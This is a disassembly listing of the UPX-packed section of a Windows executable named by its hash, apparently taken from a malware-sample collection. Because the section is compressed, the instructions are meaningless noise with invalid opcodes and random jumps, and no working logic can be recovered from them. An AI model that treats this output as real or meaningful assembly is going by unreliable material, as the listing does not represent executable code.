
308412cd93186c90be5c4c9f52c89152a153269301e691a558343f8ef008b8f1.exe:     file format pei-i386


Disassembly of section UPX1:

00690000 <UPX1>:
  690000:	sbb    al,BYTE PTR [ebx]
  690002:	add    BYTE PTR [eax],al
  690004:	outs   dx,DWORD PTR ds:[esi]
  690005:	std    
  690006:	cli    
  690007:	xor    ebp,DWORD PTR [edx+0x3e]
  69000a:	out    dx,al
  69000b:	xor    eax,0x838deb62
  690010:	pushf  
  690011:	xchg   ebx,eax
  690012:	mov    dl,0x83
  690014:	pop    ecx
  690015:	retfw  
  690017:	dec    ebp
  690018:	stc    
  690019:	fwait
  69001a:	xor    al,0x23
  69001c:	pop    ecx
  69001d:	sbb    al,0x2d
  69001f:	inc    ebp
  690020:	dec    eax
  690021:	push   cs
  690022:	fnstcw WORD PTR [ebx+edx*1-0x3d]
  690026:	mov    ds:0x6c9a94db,eax
  69002b:	mov    edi,0x64d32205
  690030:	xchg   ecx,eax
  690031:	stos   DWORD PTR es:[edi],eax
  690032:	xchg   esi,eax
  690033:	aas    
  690034:	lock add al,0xf2
  690037:	pop    eax
  690038:	jmp    0x113b:0x8aa4c312
  69003f:	mov    esi,0x7d44d8a8
  690044:	fbstp  TBYTE PTR [edx+0x47c721e9]
  69004a:	rcl    ebx,cl
  69004c:	in     eax,dx
  69004d:	(bad)  
  69004e:	std    
  69004f:	and    al,0x88
  690051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  690052:	add    al,0x4a
  690054:	xchg   ebp,eax
  690055:	fbstp  TBYTE PTR [ecx+0x746c41d6]
  69005b:	icebp  
  69005c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69005d:	ficomp WORD PTR [esi]
  69005f:	adc    BYTE PTR [ebp+0x6f],0xe5
  690063:	sbb    eax,0x7264bd02
  690068:	jo     0x690010
  69006a:	adc    al,0xb7
  69006c:	lds    ecx,FWORD PTR [ecx]
  69006e:	ss mov eax,0x83d430e9
  690074:	xor    al,0xcc
  690076:	loopne 0x6900a6
  690078:	(bad)  
  69007a:	in     al,dx
  69007b:	sub    eax,0x3ac8a3c8
  690080:	or     DWORD PTR [bp-0x731a],edx
  690085:	inc    edi
  690086:	mov    edx,DWORD PTR [ecx-0x39836b2]
  69008c:	test   BYTE PTR [esp+esi*2+0x24],ch
  690090:	add    eax,0xfec3e014
  690095:	or     BYTE PTR [ebx+0x39f09334],ah
  69009b:	add    eax,0xa4c6b980
  6900a0:	push   0x58
  6900a2:	cdq    
  6900a3:	sub    al,0x34
  6900a5:	test   al,0xc1
  6900a7:	mov    ch,0x12
  6900a9:	push   es
  6900aa:	stos   DWORD PTR es:[edi],eax
  6900ab:	pusha  
  6900ac:	inc    ecx
  6900ad:	cmc    
  6900ae:	fnsave [edx]
  6900b0:	mov    dl,0x1c
  6900b2:	sbb    edi,DWORD PTR [ebx]
  6900b4:	xor    al,0x58
  6900b6:	test   DWORD PTR [edi+0x4f8a8f05],ecx
  6900bc:	mov    edx,0x894b89f9
  6900c1:	lds    edx,FWORD PTR cs:[ebx+0x2b]
  6900c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6900c6:	cwde   
  6900c7:	sbb    DWORD PTR [ecx],esi
  6900c9:	push   es
  6900ca:	sti    
  6900cb:	mov    dh,0x3f
  6900cd:	jmp    0xeee9:0x640ed8c1
  6900d4:	cs push cs
  6900d6:	int    0x66
  6900d8:	inc    ebp
  6900d9:	es mov esi,0xde0cf151
  6900df:	cmp    ebx,0xffffff94
  6900e2:	int    0x50
  6900e4:	(bad)  
  6900e6:	sbb    eax,0x7343c545
  6900eb:	stos   DWORD PTR es:[edi],eax
  6900ec:	add    eax,0x84209c6e
  6900f1:	ret    
  6900f2:	ins    DWORD PTR es:[edi],dx
  6900f3:	jo     0x6900f9
  6900f5:	mov    dl,BYTE PTR [esi+0x7b11383b]
  6900fb:	inc    edi
  6900fc:	push   ecx
  6900fd:	(bad)  
  6900fe:	ret    0xf716
  690101:	cmp    al,0xa5
  690103:	adc    bh,dl
  690105:	mov    dl,0x67
  690107:	push   cs
  690108:	jl     0x6900a4
  69010a:	dec    eax
  69010b:	mov    WORD PTR [eax-0x5b],fs
  69010e:	imul   ecx,DWORD PTR [ebx],0x95c8a696
  690114:	mov    bl,0xc
  690116:	cmp    ch,BYTE PTR [eax]
  690118:	xchg   edx,eax
  690119:	or     eax,0xf507eedb
  69011e:	or     BYTE PTR [esi-0x3ebe5069],ch
  690124:	adc    DWORD PTR [eax],ecx
  690126:	in     eax,dx
  690127:	xor    ecx,DWORD PTR [ebp+0x61]
  69012a:	into   
  69012b:	xchg   ebx,eax
  69012c:	ror    bl,0x50
  69012f:	aam    0x1d
  690131:	sbb    esi,esp
  690133:	pop    edx
  690134:	add    DWORD PTR [ecx-0xe240167],edx
  69013a:	sub    ebx,ecx
  69013c:	out    dx,al
  69013d:	mov    edi,DWORD PTR [edx]
  69013f:	push   ss
  690140:	mov    ebp,0x15b484b3
  690145:	mov    bh,BYTE PTR [esi+0x6e40d37a]
  69014b:	scas   al,BYTE PTR es:[edi]
  69014c:	inc    ebp
  69014d:	daa    
  69014e:	and    DWORD PTR [esi-0x7a],0xfffffff2
  690152:	xor    BYTE PTR [edi],dl
  690154:	mov    dl,0x44
  690156:	retf   
  690157:	ret    
  690158:	idiv   BYTE PTR [edi-0x7e7afee0]
  69015e:	inc    ecx
  69015f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  690160:	jmp    0x690177
  690162:	sbb    eax,0xec1634df
  690167:	jecxz  0x6901b6
  690169:	xchg   esi,eax
  69016a:	xor    cl,0xca
  69016d:	mov    esp,0x186fa082
  690172:	cmp    DWORD PTR [ebp+0x2ce16034],eax
  690178:	pop    ecx
  690179:	add    BYTE PTR [ecx],al
  69017b:	call   0x7fc8fcae
  690180:	adc    al,0x23
  690182:	int3   
  690183:	sti    
  690184:	retf   0x614e
  690187:	xor    dh,bh
  690189:	cmp    ah,BYTE PTR [edx+eiz*1-0x70]
  69018d:	bound  edx,QWORD PTR [ebx]
  69018f:	test   eax,0x823f12f3
  690194:	mov    esi,DWORD PTR [edi]
  690196:	pop    ebp
  690197:	test   BYTE PTR [edi],dl
  690199:	jmp    0xf1ba5042
  69019e:	sbb    esi,esi
  6901a0:	std    
  6901a1:	push   eax
  6901a2:	repnz mov esp,0xec9edf08
  6901a8:	mov    al,ds:0xed8be9ea
  6901ad:	call   0xe7aca7c0
  6901b2:	jo     0x69021a
  6901b4:	pop    edx
  6901b5:	mov    esi,0x2c8eb20f
  6901ba:	rol    DWORD PTR [eax],1
  6901bc:	sbb    BYTE PTR [ebp+0x8],cl
  6901bf:	push   ds
  6901c0:	pop    edi
  6901c1:	sub    DWORD PTR [esi+0x32],0xffffff8d
  6901c5:	mul    BYTE PTR [eax]
  6901c7:	rcr    BYTE PTR [ebp-0x40b88172],cl
  6901cd:	fldenv [ecx+esi*4-0x4f]
  6901d1:	ja     0x6901e1
  6901d3:	dec    ebx
  6901d4:	fwait
  6901d5:	sbb    DWORD PTR ds:0xa1e65134,edi
  6901db:	rcr    DWORD PTR [ebx-0x13],cl
  6901de:	xchg   ebx,eax
  6901df:	jae    0x69020f
  6901e1:	retf   0x1979
  6901e4:	imul   esp,DWORD PTR [edx+0x8410166],0x6e
  6901eb:	inc    esp
  6901ec:	jne    0x6901f0
  6901ee:	loopne 0x69019b
  6901f0:	pop    ecx
  6901f1:	in     eax,0xd8
  6901f3:	xor    DWORD PTR [esi+edi*1+0x434f5e6e],edx
  6901fa:	xchg   ebx,eax
  6901fb:	pop    ebx
  6901fc:	cmp    BYTE PTR [ebp-0x32],ah
  6901ff:	add    bh,BYTE PTR [esi]
  690201:	xlat   BYTE PTR ds:[ebx]
  690202:	sub    bl,bl
  690204:	xchg   ecx,eax
  690205:	frstor [ebx-0x51]
  690208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  690209:	jp     0x690220
  69020b:	gs (bad) 
  69020d:	cmp    DWORD PTR [edi+0x67f01585],ebp
  690213:	mov    edx,0x46a989b2
  690218:	jo     0x69026e
  69021a:	mov    al,ds:0x1d40ac36
  69021f:	lods   al,BYTE PTR ds:[esi]
  690220:	dec    edx
  690221:	sub    ebx,DWORD PTR [eax+0x722a67b5]
  690227:	out    dx,al
  690228:	inc    esp
  690229:	rcl    BYTE PTR [ebp-0x108f1d8e],1
  69022f:	out    dx,eax
  690230:	fld    QWORD PTR ds:0x899c75ce
  690236:	aam    0x6b
  690238:	fwait
  690239:	shl    bh,0xfa
  69023c:	int3   
  69023d:	in     al,0x45
  69023f:	sub    DWORD PTR [edx+0x57ca8f73],ebx
  690245:	xchg   esp,eax
  690246:	push   ds
  690247:	cmp    eax,0xe72d379d
  69024c:	out    0x19,al
  69024e:	cmp    DWORD PTR [ecx+0x31],eax
  690251:	and    al,0xa9
  690253:	aaa    
  690254:	shl    DWORD PTR [edx-0x24],0x40
  690258:	cwde   
  690259:	pop    eax
  69025a:	out    dx,eax
  69025b:	sbb    BYTE PTR [edx+0x3623e85d],cl
  690261:	aad    0x41
  690263:	push   cs
  690264:	ret    
  690265:	jl     0x690269
  690267:	in     eax,dx
  690268:	(bad)  
  690269:	and    al,0xb0
  69026b:	cmp    BYTE PTR [eax+0x542ab458],0x19
  690272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  690273:	mov    edi,0x7dccdc01
  690278:	cwde   
  690279:	xor    bh,BYTE PTR [ebx+0x3b]
  69027c:	js     0x6902fa
  69027e:	sub    BYTE PTR [edi],bh
  690280:	ret    0xda3c
  690283:	push   es
  690284:	jl     0x690256
  690286:	and    DWORD PTR [edi],eax
  690288:	nop
  690289:	pop    sp
  69028b:	ds cld 
  69028d:	mov    al,0x52
  69028f:	pusha  
  690290:	sti    
  690291:	sahf   
  690292:	(bad)  
  690293:	(bad)  
  690294:	adc    ah,BYTE PTR [edi-0x4ec8656e]
  69029a:	test   eax,0x52850a04
  69029f:	sahf   
  6902a0:	or     cl,BYTE PTR [eax-0x48]
  6902a3:	ret    0xe9d0
  6902a6:	stos   DWORD PTR es:[edi],eax
  6902a7:	pop    esp
  6902a8:	jne    0x6902f5
  6902aa:	xor    eax,0x486e9af0
  6902af:	dec    esi
  6902b0:	pop    ds
  6902b1:	les    esi,FWORD PTR [eax+0x5d]
  6902b4:	xor    bl,cl
  6902b6:	daa    
  6902b7:	inc    ebx
  6902b8:	and    edx,DWORD PTR [edx+0x4b]
  6902bb:	cli    
  6902bc:	lock outs dx,DWORD PTR ds:[esi]
  6902be:	mov    ch,0x8d
  6902c0:	xor    al,0xf0
  6902c2:	pop    ds
  6902c3:	rcr    BYTE PTR [edi-0x3f],1
  6902c6:	outs   dx,BYTE PTR ds:[esi]
  6902c7:	iret   
  6902c8:	syscall 
  6902ca:	jmp    0x69032c
  6902cc:	aaa    
  6902cd:	stos   DWORD PTR es:[edi],eax
  6902ce:	add    edx,DWORD PTR [ebp+edi*8-0x6a]
  6902d2:	mov    cl,0x3
  6902d4:	not    BYTE PTR [eax-0x420351]
  6902da:	push   esp
  6902db:	mov    ch,BYTE PTR [esi-0x37]
  6902de:	cmp    eax,0x112b13f6
  6902e3:	dec    esi
  6902e4:	call   0xced128e5
  6902e9:	ret    0xa5bc
  6902ec:	sub    ebp,eax
  6902ee:	fimul  DWORD PTR [esi+0x78b7bd6c]
  6902f4:	retf   0xa0c4
  6902f7:	icebp  
  6902f8:	mov    bh,0x75
  6902fa:	mov    edi,0x3777a5d3
  6902ff:	cmp    ch,ch
  690301:	das    
  690302:	push   ss
  690303:	iret   
  690304:	jnp    0x69030b
  690306:	xchg   BYTE PTR [edi-0x70],dl
  690309:	mov    eax,ds:0xce546dd7
  69030e:	xor    bl,BYTE PTR [edi+edi*1+0x39fee8fe]
  690315:	xchg   ebx,eax
  690316:	ds pop ebp
  690318:	sbb    al,0xfc
  69031a:	mov    DWORD PTR [edi-0x37948f09],ebp
  690320:	out    0xfe,al
  690322:	inc    ebx
  690323:	fcomp  st(5)
  690325:	sub    eax,0x49ec188e
  69032a:	aad    0xff
  69032c:	repnz or ebx,DWORD PTR [eax-0x5]
  690330:	outs   dx,DWORD PTR ds:[esi]
  690331:	push   0xffffffa5
  690333:	stc    
  690334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690335:	outs   dx,BYTE PTR es:[esi]
  690337:	dec    eax
  690338:	test   BYTE PTR [edi],ah
  69033a:	and    edx,eax
  69033c:	inc    edx
  69033d:	into   
  69033e:	xor    bl,bl
  690340:	call   0x75bf:0x84524c34
  690347:	(bad)
  69034b:	pop    ecx
  69034c:	sbb    BYTE PTR [ecx-0x6d],0x38
  690350:	inc    BYTE PTR [edi+0x19bc53ce]
  690356:	icebp  
  690357:	xor    ebp,eax
  690359:	fcom   DWORD PTR [eax-0x29]
  69035c:	shl    bh,1
  69035e:	jge    0x69036d
  690360:	mov    al,ds:0x44b65688
  690365:	lahf   
  690366:	stc    
  690367:	mov    ah,0x4f
  690369:	or     eax,DWORD PTR [edi+0x6d]
  69036c:	loope  0x6903ce
  69036e:	mov    edi,0xccf8f0cd
  690373:	and    ebp,DWORD PTR [eax-0x15]
  690376:	mov    ds:0x4cd741b3,al
  69037b:	dec    eax
  69037c:	push   eax
  69037d:	or     BYTE PTR [eax],cl
  69037f:	pop    eax
  690380:	fs sub al,0x55
  690383:	clc    
  690384:	hlt    
  690385:	rcr    BYTE PTR [eax-0x6e27ccef],1
  69038b:	jle    0x69034d
  69038d:	jno    0x69033c
  69038f:	xor    dh,BYTE PTR [ebp-0x16]
  690392:	in     al,dx
  690393:	pop    eax
  690394:	clc    
  690395:	fnstenv [ebx+0x4f]
  690398:	sbb    BYTE PTR [eax-0x1b],dh
  69039b:	icebp  
  69039c:	mov    edi,0x4ac49ac6
  6903a1:	pop    esp
  6903a2:	adc    bh,BYTE PTR [edi]
  6903a4:	addr16 or al,0x6
  6903a7:	ins    BYTE PTR es:[edi],dx
  6903a8:	sar    BYTE PTR [ecx],0xd0
  6903ab:	out    0xd2,al
  6903ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6903ae:	mov    ds:0x7449e35f,eax
  6903b3:	sub    ebx,ebx
  6903b5:	cmp    bl,ah
  6903b7:	jmp    0x27e57766
  6903bc:	ins    BYTE PTR es:[edi],dx
  6903bd:	fnstcw WORD PTR [edx+0x55]
  6903c0:	or     eax,0xae07ec91
  6903c5:	inc    esi
  6903c6:	nop
  6903c7:	call   0x84c1:0xff68a68a
  6903ce:	mov    ecx,0x4b008ed5
  6903d3:	cmc    
  6903d4:	cld    
  6903d5:	dec    esi
  6903d6:	fsubr  st,st(4)
  6903d8:	pusha  
  6903d9:	test   al,0x19
  6903db:	inc    esi
  6903dc:	call   0xe1a13a7e
  6903e1:	xor    eax,0x6b36c153
  6903e6:	sar    BYTE PTR [edx],0xbf
  6903e9:	jne    0x6903fb
  6903eb:	cli    
  6903ec:	scas   eax,DWORD PTR es:[edi]
  6903ed:	push   cs
  6903ee:	adc    al,bh
  6903f0:	or     eax,0x4088583b
  6903f5:	cmc    
  6903f6:	ins    BYTE PTR es:[edi],dx
  6903f7:	ret    0x73a5
  6903fa:	or     eax,0x4eac3b78
  6903ff:	and    edi,ecx
  690401:	adc    ah,dl
  690403:	push   es
  690404:	jge    0x690448
  690406:	push   ecx
  690407:	(bad)  
  690409:	jg     0x6903d3
  69040b:	std    
  69040c:	fst    DWORD PTR [edi]
  69040e:	or     ebp,ebx
  690410:	lock lods al,BYTE PTR ds:[esi]
  690412:	in     eax,0x38
  690414:	call   0xab5c:0x8e3b94b
  69041b:	jecxz  0x6903aa
  69041d:	mov    cl,0xf4
  69041f:	repnz repz push ss
  690422:	sti    
  690423:	sbb    DWORD PTR [ebx-0x11052147],ebx
  690429:	iret   
  69042a:	mov    esp,0xbe6427f7
  69042f:	xor    esp,DWORD PTR [eax-0x2]
  690432:	gs addr16 in al,dx
  690435:	xor    ah,BYTE PTR [eax+0x7]
  690438:	fsub   DWORD PTR [eax+edx*8-0x72]
  69043c:	(bad)  
  69043d:	out    0x8e,eax
  69043f:	jb     0x69044d
  690441:	jg     0x690435
  690443:	cmp    BYTE PTR [ecx],ah
  690445:	stos   BYTE PTR es:[edi],al
  690446:	lods   al,BYTE PTR ds:[esi]
  690447:	and    al,0xef
  690449:	jae    0x69045f
  69044b:	sar    DWORD PTR ss:[eax+0x44],1
  69044f:	mov    eax,0x32f2f784
  690454:	dec    esi
  690455:	mov    esi,0xb96cf69
  69045a:	mov    eax,0xc8e91adc
  69045f:	stc    
  690460:	ins    BYTE PTR es:[edi],dx
  690461:	outs   dx,BYTE PTR ds:[esi]
  690462:	sbb    ecx,esi
  690464:	add    ecx,esi
  690466:	xchg   ebp,eax
  690467:	cwde   
  690468:	sbb    eax,0x5570ca4c
  69046d:	sub    dh,al
  69046f:	xchg   esp,eax
  690470:	int3   
  690471:	jp     0x6904d3
  690473:	mov    al,ds:0x70840f82
  690478:	call   0x444e:0x92626747
  69047f:	push   cs
  690480:	call   0x8d2c10a6
  690485:	xor    cl,BYTE PTR [esi+edx*4]
  690488:	stos   BYTE PTR es:[edi],al
  690489:	add    ch,BYTE PTR [edx]
  69048b:	(bad)  
  69048d:	mov    al,ds:0xd63c54e2
  690492:	push   cs
  690493:	adc    BYTE PTR [eax+0x1ef5190],ch
  690499:	mov    WORD PTR [ebp-0x6d],?
  69049c:	sbb    eax,0xd79baef0
  6904a1:	dec    ebx
  6904a2:	js     0x69051a
  6904a4:	jecxz  0x69042b
  6904a6:	pop    es
  6904a7:	js     0x690440
  6904a9:	lock pushf 
  6904ab:	test   eax,0xe24c4301
  6904b0:	jg     0x6904aa
  6904b2:	rcr    DWORD PTR [ecx],1
  6904b4:	mov    eax,0x6eda7856
  6904b9:	mov    dl,0xf3
  6904bb:	mov    ch,0xb4
  6904bd:	pop    edx
  6904be:	lods   eax,DWORD PTR ds:[esi]
  6904bf:	jno    0x6904ba
  6904c1:	adc    eax,eax
  6904c3:	pusha  
  6904c4:	sub    BYTE PTR [ecx+0xf],ah
  6904c7:	fild   QWORD PTR [ebx+0x6f7a6e60]
  6904cd:	loop   0x69048b
  6904cf:	(bad)  
  6904d0:	clc    
  6904d1:	push   ecx
  6904d2:	sub    esp,edi
  6904d4:	ret    0xa554
  6904d7:	cs push edx
  6904d9:	das    
  6904da:	and    ebp,DWORD PTR [eax+0x67e5bd40]
  6904e0:	xchg   edi,ecx
  6904e2:	aas    
  6904e3:	cmp    al,0xb8
  6904e5:	pop    ss
  6904e6:	add    dl,cl
  6904e8:	adc    DWORD PTR [eax],esi
  6904ea:	ds enter 0x866a,0x5f
  6904ef:	fnclex 
  6904f1:	test   al,0x7a
  6904f3:	dec    eax
  6904f4:	dec    edx
  6904f5:	(bad)  [ebp+0x176506fe]
  6904fb:	mov    ds:0x6d7ce919,eax
  690500:	shr    BYTE PTR [esi],cl
  690502:	jns    0x690557
  690504:	das    
  690505:	in     al,0xd5
  690507:	jno    0x6904f9
  690509:	push   esp
  69050a:	jecxz  0x6904c9
  69050c:	cmp    al,0x56
  69050e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69050f:	jl     0x6904c2
  690511:	fsub   DWORD PTR [edx-0x6a]
  690514:	jae    0x6904fe
  690516:	jo     0x69051c
  690518:	cmc    
  690519:	(bad)  
  69051a:	cmp    DWORD PTR [ecx+ebx*8+0x7e],ebp
  69051e:	adc    al,0x80
  690520:	leave  
  690521:	push   eax
  690522:	imul   ebx,edi,0xffffffcf
  690525:	(bad)  
  690526:	gs data16 xor al,0x50
  69052a:	je     0x690524
  69052c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69052d:	adc    dl,BYTE PTR [ebx+0x50]
  690530:	loop   0x6904d3
  690532:	(bad)  
  690533:	cmp    al,0xea
  690535:	cli    
  690536:	cs xchg ebp,eax
  690538:	int    0xe5
  69053a:	mov    dl,0xdf
  69053c:	inc    ebp
  69053d:	sar    DWORD PTR [edi-0x2e1b55b3],0x38
  690544:	dec    esp
  690545:	pop    es
  690546:	in     al,0x7f
  690548:	pop    eax
  690549:	lahf   
  69054a:	push   ebp
  69054b:	adc    al,0x22
  69054d:	stc    
  69054e:	jp     0x6905bf
  690550:	enter  0x4601,0x3a
  690554:	ret    0x72a6
  690557:	leave  
  690558:	and    eax,DWORD PTR [ebp-0x22]
  69055b:	(bad)  
  69055e:	pop    esi
  69055f:	pop    es
  690560:	in     al,dx
  690561:	fs sub al,0x13
  690564:	aas    
  690565:	popa   
  690566:	jge    0x6904f7
  690568:	bound  ebx,QWORD PTR [ecx-0x63816db0]
  69056e:	loopne 0x690532
  690570:	cmp    BYTE PTR [ebx+edx*2],bl
  690573:	and    eax,0xd652692
  690578:	stos   BYTE PTR es:[edi],al
  690579:	stos   BYTE PTR es:[edi],al
  69057a:	les    esp,FWORD PTR [edx-0x6bd9d1e4]
  690580:	push   edx
  690581:	mov    ebx,0x4aa2314b
  690586:	ret    
  690587:	fsubp  st(1),st
  690589:	xchg   edx,eax
  69058a:	jno    0x69055a
  69058c:	and    eax,0x8c5701a1
  690591:	div    al
  690593:	xor    eax,0xf8b263fc
  690598:	out    0xab,al
  69059a:	push   cs
  69059b:	mov    ebx,0x43d1d2f5
  6905a0:	mov    ch,0xb
  6905a2:	cli    
  6905a3:	scas   eax,DWORD PTR es:[edi]
  6905a4:	cmp    BYTE PTR [edi-0x24],al
  6905a7:	sbb    edx,ebp
  6905a9:	gs jae 0x69060d
  6905ac:	fld    TBYTE PTR [edx+0xc]
  6905af:	xor    al,0x99
  6905b1:	pusha  
  6905b2:	(bad)  
  6905b3:	fbld   TBYTE PTR [edi+eax*4]
  6905b6:	(bad)  
  6905b8:	mov    BYTE PTR [edx-0x3a043d1d],al
  6905be:	loop   0x69059a
  6905c0:	jno    0x690558
  6905c2:	jae    0x690549
  6905c4:	aas    
  6905c5:	mov    ah,BYTE PTR [ebp-0x7cf087b4]
  6905cb:	push   edx
  6905cc:	add    ah,BYTE PTR [edi-0x45]
  6905cf:	xlat   BYTE PTR ds:[ebx]
  6905d0:	jno    0x6905ab
  6905d2:	mov    al,ss:0x5c6dd304
  6905d8:	bound  edx,QWORD PTR [eax-0x4b]
  6905db:	jg     0x69061d
  6905dd:	fcomip st,st(6)
  6905df:	push   0x24
  6905e1:	int    0x6
  6905e3:	push   es
  6905e4:	dec    esp
  6905e5:	les    esp,FWORD PTR [eax-0x31]
  6905e8:	and    BYTE PTR [ebp-0x61],bl
  6905eb:	adc    eax,ecx
  6905ed:	idiv   DWORD PTR [eax]
  6905ef:	ins    BYTE PTR es:[edi],dx
  6905f0:	or     ah,bh
  6905f2:	inc    edi
  6905f3:	(bad)  
  6905f4:	fsubr  DWORD PTR [ebp+ebp*2-0x7c]
  6905f8:	add    ch,bh
  6905fa:	mov    esi,es
  6905fc:	sub    BYTE PTR [ecx],0xe
  6905ff:	into   
  690600:	dec    eax
  690601:	inc    ebp
  690602:	das    
  690603:	cwde   
  690604:	sbb    eax,0x7e65d788
  690609:	or     eax,edx
  69060b:	addr16 and esp,ebx
  69060e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69060f:	sbb    DWORD PTR [ebp+0x7f],esp
  690612:	add    DWORD PTR [edi],edx
  690614:	xchg   DWORD PTR [eax+0x19],edx
  690617:	adc    edx,DWORD PTR [si+0x248]
  69061c:	test   eax,0x9a204dc2
  690621:	add    eax,edi
  690623:	arpl   WORD PTR [ebx],cx
  690625:	(bad)  
  690626:	icebp  
  690627:	out    0x0,al
  690629:	mov    edx,0xfe7a8c8e
  69062e:	xchg   ebp,eax
  69062f:	mov    ah,0xe0
  690631:	adc    DWORD PTR [ebx-0x680389c8],0xe8257885
  69063b:	cmp    al,0x31
  69063d:	push   eax
  69063e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69063f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  690640:	inc    esp
  690641:	mov    BYTE PTR [edi],al
  690643:	(bad)  
  690644:	fdivr  QWORD PTR ss:[edx+0x23e9495e]
  69064b:	js     0x6905e2
  69064d:	mov    eax,0x413696a9
  690652:	mov    bl,0x4a
  690654:	inc    esp
  690655:	aad    0x4
  690657:	imul   ebx,DWORD PTR [edx+0x2b],0xdcb493ac
  69065e:	add    BYTE PTR [ebp+0x69],bh
  690661:	pop    esi
  690662:	add    al,0xfb
  690664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  690665:	(bad)  
  690666:	push   ecx
  690667:	pop    ebx
  690668:	or     esi,ebp
  69066a:	in     eax,dx
  69066b:	out    0x34,al
  69066d:	xor    DWORD PTR [esi-0x55],edx
  690670:	loopne 0x6906e2
  690672:	je     0x690639
  690674:	div    BYTE PTR [edx]
  690676:	cmp    eax,0xdd8b4ac8
  69067b:	ins    BYTE PTR es:[edi],dx
  69067c:	sahf   
  69067d:	inc    ebx
  69067e:	(bad)  
  69067f:	(bad)  
  690680:	mov    ds:0xc536dbc7,al
  690685:	(bad)  
  690686:	out    dx,eax
  690687:	cmp    edi,DWORD PTR [ecx-0x3078e253]
  69068d:	retf   0x985f
  690690:	mov    al,0x7b
  690692:	sub    DWORD PTR [ebx+0x627c1a44],esi
  690698:	setle  BYTE PTR [ecx]
  69069b:	mov    eax,0x1da7fcfb
  6906a0:	shr    DWORD PTR [edx-0xc],cl
  6906a3:	jno    0x6906ff
  6906a5:	stc    
  6906a6:	or     ah,BYTE PTR [ebx+0x37a11774]
  6906ac:	mov    ah,0xce
  6906ae:	mov    al,bh
  6906b0:	xchg   esi,eax
  6906b1:	xchg   ebx,eax
  6906b2:	xchg   esi,edi
  6906b4:	bound  ebp,QWORD PTR [eax+0x1b]
  6906b7:	test   DWORD PTR [ecx+eiz*8-0x43],esi
  6906bb:	retf   
  6906bc:	mov    eax,0xe0271f28
  6906c1:	jmp    0x7f37e003
  6906c6:	xchg   edx,eax
  6906c7:	not    bl
  6906c9:	mov    BYTE PTR [eax+edx*2],0xac
  6906cd:	jns    0x6906c9
  6906cf:	mov    DWORD PTR [eax-0x23],esp
  6906d2:	iret   
  6906d3:	cdq    
  6906d4:	aad    0x89
  6906d6:	xor    eax,eax
  6906d8:	push   eax
  6906d9:	mov    bh,0x7c
  6906db:	fwait
  6906dc:	or     eax,0x5713e415
  6906e1:	repnz lds esp,FWORD PTR [esi+0x4f]
  6906e5:	repnz pushf 
  6906e7:	fidiv  WORD PTR es:[ebx-0x65]
  6906eb:	(bad)  [ecx-0x60]
  6906ee:	and    esp,DWORD PTR [edi-0x2e8c00a7]
  6906f4:	je     0x690679
  6906f6:	je     0x6906a9
  6906f8:	cs mov ch,0xa7
  6906fb:	retf   0x42b
  6906fe:	or     BYTE PTR [ebp-0x35],ch
  690701:	jle    0x69073b
  690703:	xchg   ebp,eax
  690704:	pop    esi
  690705:	inc    esp
  690706:	ja     0x69075c
  690708:	jb     0x69071e
  69070a:	inc    ecx
  69070b:	out    0x79,al
  69070d:	mov    esi,0xd3b5c4d3
  690712:	pop    ebp
  690713:	push   0x29
  690715:	xchg   BYTE PTR [eax],bl
  690717:	mov    ecx,0x47feb888
  69071c:	shl    BYTE PTR [eax+0x15194903],0xd8
  690723:	mov    bh,0xd3
  690725:	cli    
  690726:	pop    esp
  690727:	imul   ebp,DWORD PTR cs:[edi+0x1d],0xb0d5d870
  69072f:	mov    WORD PTR [eax+eiz*4+0x45],cs
  690733:	jge    0x6906d1
  690735:	mov    edi,0x132ef3e5
  69073b:	pusha  
  69073c:	xor    al,0x20
  69073e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69073f:	test   eax,0xd164f716
  690744:	xchg   DWORD PTR [eax+0x5e01b74b],edi
  69074a:	xor    DWORD PTR [ebx-0x532a3798],eax
  690750:	out    dx,eax
  690751:	mov    ah,0x91
  690753:	jecxz  0x69075e
  690755:	or     eax,0x3fb0a4c7
  69075a:	into   
  69075b:	mov    edi,0xb4ea3844
  690760:	or     eax,0xe19c645a
  690765:	mov    cl,0x5c
  690767:	mov    ds:0x19cce0d1,eax
  69076c:	outs   dx,BYTE PTR ds:[esi]
  69076d:	sbb    ecx,DWORD PTR [edx+0x29478399]
  690773:	loopne 0x690740
  690775:	sub    eax,esp
  690777:	xbegin 0xe17ddbe1
  69077d:	sbb    eax,0xab26b5ae
  690782:	pusha  
  690783:	mov    eax,ds:0x7938fe5f
  690788:	cli    
  690789:	fcomp  DWORD PTR [ebp+esi*8-0x5a]
  69078d:	inc    eax
  69078e:	cdq    
  69078f:	mov    BYTE PTR [ebp+0x29c4c225],bh
  690795:	and    al,0xca
  690797:	idiv   BYTE PTR [ebp+0x33]
  69079a:	or     al,0x7
  69079c:	pop    es
  69079d:	aaa    
  69079e:	stc    
  69079f:	imul   edi,DWORD PTR [edi],0x50
  6907a2:	dec    esi
  6907a3:	pop    ecx
  6907a4:	cmp    BYTE PTR [edi],dl
  6907a6:	jg     0x69081f
  6907a8:	push   ds
  6907a9:	jnp    0x6907fe
  6907ab:	adc    bh,BYTE PTR [edx-0x79]
  6907ae:	and    al,0xa
  6907b0:	and    eax,0x1993cf79
  6907b5:	jl     0x69079e
  6907b7:	cmp    eax,0xa8cd30b0
  6907bc:	hlt    
  6907bd:	in     al,dx
  6907be:	mov    al,ds:0x409590a9
  6907c3:	mov    gs,WORD PTR [ecx]
  6907c5:	dec    ebx
  6907c6:	mov    ebx,0x9244e425
  6907cb:	outs   dx,BYTE PTR ds:[esi]
  6907cc:	loope  0x6907e4
  6907ce:	fist   WORD PTR [esi-0x55]
  6907d1:	out    0x4e,al
  6907d3:	mov    eax,0xcae09edf
